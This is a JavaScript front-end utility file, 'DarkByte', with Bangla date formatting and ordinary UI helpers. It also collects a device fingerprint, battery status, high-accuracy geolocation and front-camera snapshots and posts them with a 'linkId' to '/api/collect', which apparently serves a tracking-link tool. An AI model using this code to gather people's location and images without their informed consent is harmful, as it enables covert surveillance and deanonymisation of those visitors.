// Global utility functions
const DarkByte = {
    
    // Initialize
    init: function() {
        this.setupEventListeners();
        this.detectDevice();
        this.startHeartbeat();
    },
    
    // Setup event listeners
    setupEventListeners: function() {
        document.addEventListener('DOMContentLoaded', () => {
            this.initTooltips();
            this.initModals();
            this.initForms();
        });
    },
    
    // Detect device info
    detectDevice: function() {
        const info = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            colorDepth: window.screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            connection: navigator.connection ? {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            } : null
        };
        
        return info;
    },
    
    // Get battery info
    getBatteryInfo: async function() {
        if (!navigator.getBattery) {
            return null;
        }
        
        try {
            const battery = await navigator.getBattery();
            return {
                level: battery.level * 100,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch (error) {
            console.error('Battery API error:', error);
            return null;
        }
    },
    
    // Get location
    getLocation: function(options = {}) {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error('Geolocation not supported'));
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: position.timestamp
                    });
                },
                (error) => {
                    reject(error);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0,
                    ...options
                }
            );
        });
    },
    
    // Get camera access
    getCamera: async function(options = {}) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    facingMode: 'user'
                },
                audio: false,
                ...options
            });
            
            return stream;
        } catch (error) {
            console.error('Camera error:', error);
            throw error;
        }
    },
    
    // Capture image from stream
    captureImage: function(videoElement) {
        return new Promise((resolve) => {
            const canvas = document.createElement('canvas');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            canvas.getContext('2d').drawImage(videoElement, 0, 0);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            resolve(imageData);
        });
    },
    
    // Send data to server
    sendData: async function(linkId, type, data) {
        try {
            const response = await fetch('/api/collect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    linkId: linkId,
                    type: type,
                    data: data
                })
            });
            
            return await response.json();
        } catch (error) {
            console.error('Send data error:', error);
            throw error;
        }
    },
    
    // Format bytes
    formatBytes: function(bytes, decimals = 2) {
        if (bytes === 0) return '0 Bytes';
        
        const k = 1024;
        const dm = decimals < 0 ? 0 : decimals;
        const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
        
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        
        return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
    },
    
    // Format date
    formatDate: function(date, format = 'short') {
        const d = new Date(date);
        
        if (format === 'short') {
            return d.toLocaleDateString('bn-BD');
        } else if (format === 'long') {
            return d.toLocaleString('bn-BD', {
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit'
            });
        } else if (format === 'time') {
            return d.toLocaleTimeString('bn-BD');
        }
        
        return d.toISOString();
    },
    
    // Time ago
    timeAgo: function(date) {
        const now = new Date();
        const past = new Date(date);
        const diffMs = now - past;
        const diffSec = Math.floor(diffMs / 1000);
        const diffMin = Math.floor(diffSec / 60);
        const diffHour = Math.floor(diffMin / 60);
        const diffDay = Math.floor(diffHour / 24);
        
        if (diffSec < 60) return `${diffSec} seconds ago`;
        if (diffMin < 60) return `${diffMin} minutes ago`;
        if (diffHour < 24) return `${diffHour} hours ago`;
        if (diffDay < 30) return `${diffDay} days ago`;
        
        return this.formatDate(date);
    },
    
    // Copy to clipboard
    copyToClipboard: function(text) {
        return navigator.clipboard.writeText(text);
    },
    
    // Show notification
    showNotification: function(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = `alert alert-${type}`;
        notification.innerHTML = message;
        notification.style.position = 'fixed';
        notification.style.top = '20px';
        notification.style.right = '20px';
        notification.style.zIndex = '9999';
        notification.style.maxWidth = '300px';
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.remove();
        }, 5000);
    },
    
    // Show loading
    showLoading: function(container) {
        const loader = document.createElement('div');
        loader.className = 'spinner';
        loader.id = 'loading-spinner';
        
        if (container) {
            container.innerHTML = '';
            container.appendChild(loader);
        } else {
            document.body.appendChild(loader);
        }
        
        return loader;
    },
    
    // Hide loading
    hideLoading: function() {
        const loader = document.getElementById('loading-spinner');
        if (loader) {
            loader.remove();
        }
    },
    
    // Initialize tooltips
    initTooltips: function() {
        const tooltips = document.querySelectorAll('[data-tooltip]');
        tooltips.forEach(el => {
            el.addEventListener('mouseenter', (e) => {
                const tooltip = document.createElement('div');
                tooltip.className = 'tooltip';
                tooltip.textContent = el.dataset.tooltip;
                tooltip.style.position = 'absolute';
                tooltip.style.background = '#333';
                tooltip.style.color = '#fff';
                tooltip.style.padding = '5px 10px';
                tooltip.style.borderRadius = '4px';
                tooltip.style.fontSize = '12px';
                tooltip.style.zIndex = '1000';
                
                const rect = el.getBoundingClientRect();
                tooltip.style.top = rect.top - 30 + 'px';
                tooltip.style.left = rect.left + 'px';
                
                document.body.appendChild(tooltip);
                
                el.addEventListener('mouseleave', () => {
                    tooltip.remove();
                }, { once: true });
            });
        });
    },
    
    // Initialize modals
    initModals: function() {
        const modals = document.querySelectorAll('.modal');
        const triggers = document.querySelectorAll('[data-toggle="modal"]');
        
        triggers.forEach(trigger => {
            trigger.addEventListener('click', () => {
                const target = document.querySelector(trigger.dataset.target);
                if (target) {
                    target.style.display = 'block';
                }
            });
        });
        
        modals.forEach(modal => {
            const closeBtn = modal.querySelector('.close');
            if (closeBtn) {
                closeBtn.addEventListener('click', () => {
                    modal.style.display = 'none';
                });
            }
            
            window.addEventListener('click', (e) => {
                if (e.target === modal) {
                    modal.style.display = 'none';
                }
            });
        });
    },
    
    // Initialize forms
    initForms: function() {
        const forms = document.querySelectorAll('form[data-ajax]');
        
        forms.forEach(form => {
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                
                const submitBtn = form.querySelector('[type="submit"]');
                const originalText = submitBtn.textContent;
                
                submitBtn.disabled = true;
                submitBtn.textContent = 'Processing...';
                
                try {
                    const formData = new FormData(form);
                    const data = Object.fromEntries(formData.entries());
                    
                    const response = await fetch(form.action, {
                        method: form.method || 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(data)
                    });
                    
                    const result = await response.json();
                    
                    if (response.ok) {
                        this.showNotification('Success!', 'success');
                        if (form.dataset.redirect) {
                            window.location.href = form.dataset.redirect;
                        }
                    } else {
                        this.showNotification(result.error || 'Error occurred', 'danger');
                    }
                } catch (error) {
                    this.showNotification('Network error', 'danger');
                } finally {
                    submitBtn.disabled = false;
                    submitBtn.textContent = originalText;
                }
            });
        });
    },
    
    // Start heartbeat (ping server every 30 seconds)
    startHeartbeat: function() {
        setInterval(async () => {
            try {
                await fetch('/health');
            } catch (error) {
                console.error('Heartbeat failed:', error);
            }
        }, 30000);
    },
    
    // Check if element is in viewport
    isInViewport: function(el) {
        const rect = el.getBoundingClientRect();
        return (
            rect.top >= 0 &&
            rect.left >= 0 &&
            rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) &&
            rect.right <= (window.innerWidth || document.documentElement.clientWidth)
        );
    },
    
    // Debounce function
    debounce: function(func, wait) {
        let timeout;
        return function executedFunction(...args) {
            const later = () => {
                clearTimeout(timeout);
                func(...args);
            };
            clearTimeout(timeout);
            timeout = setTimeout(later, wait);
        };
    },
    
    // Throttle function
    throttle: function(func, limit) {
        let inThrottle;
        return function(...args) {
            if (!inThrottle) {
                func.apply(this, args);
                inThrottle = true;
                setTimeout(() => inThrottle = false, limit);
            }
        };
    }
};

// Initialize on load
DarkByte.init();

// Export for use in other files
if (typeof module !== 'undefined' && module.exports) {
    module.exports = DarkByte;
}